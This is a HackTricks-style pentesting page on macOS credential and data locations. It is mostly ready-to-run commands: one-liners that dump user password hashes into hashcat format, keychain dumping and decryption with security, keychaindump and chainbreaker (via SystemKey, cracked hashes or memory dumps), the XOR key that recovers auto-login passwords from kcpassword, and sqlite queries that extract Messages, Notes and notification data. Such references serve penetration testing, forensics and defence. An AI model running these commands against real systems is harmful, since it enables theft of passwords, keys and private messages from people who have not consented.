# macOS Sensitive Locations

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Passwords

### Shadow Passwords

Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
The following oneliner can be use to dump **all the information about the users** (including hash info):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.

An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Keychain Dump

Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.

```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
{% endhint %}

The attacker still needs to gain access to the system as well as escalate to **root** privileges in order to run **keychaindump**. This approach comes with its own conditions. As mentioned earlier, **upon login your keychain is unlocked by default** and remains unlocked while you use your system. This is for convenience so that the user doesn’t need to enter their password every time an application wishes to access the keychain. If the user has changed this setting and chosen to lock the keychain after every use, keychaindump will no longer work; it relies on an unlocked keychain to function.

It’s important to understand how Keychaindump extracts passwords out of memory. The most important process in this transaction is the ”**securityd**“ **process**. Apple refers to this process as a **security context daemon for authorization and cryptographic operations**. The Apple developer libraries don’t say a whole lot about it; however, they do tell us that securityd handles access to the keychain. In his research, Juuso refers to the **key needed to decrypt the keychain as ”The Master Key“**. A number of steps need to be taken to acquire this key as it is derived from the user’s OS X login password. If you want to read the keychain file you must have this master key. The following steps can be done to acquire it. **Perform a scan of securityd’s heap (keychaindump does this with the vmmap command)**. Possible master keys are stored in an area flagged as MALLOC\_TINY. You can see the locations of these heaps yourself with the following command:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

**Keychaindump** will then search the returned heaps for occurrences of 0x0000000000000018. If the following 8-byte value points to the current heap, we’ve found a potential master key. From here a bit of deobfuscation still needs to occur which can be seen in the source code, but as an analyst the most important part to note is that the necessary data to decrypt this information is stored in securityd’s process memory. Here’s an example of keychain dump output.

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:

* Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
* Internet Passwords
* Generic Passwords
* Private Keys
* Public Keys
* X509 Certificates
* Secure Notes
* Appleshare Passwords

Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.

Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.

### **Dump keychain keys**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

### **Dump keychain keys (with passwords) with SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

### **Dump keychain keys (with passwords) cracking the hash**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

### **Dump keychain keys (with passwords) with memory dump**

[Follow these steps](..#dumping-memory-with-osxpmem) to perform a **memory dump**

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

### **Dump keychain keys (with passwords) using users password**

If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications

You can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Most of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform** it to **human** **readable** or use **`strings`**. To access it you can do:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notes

The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
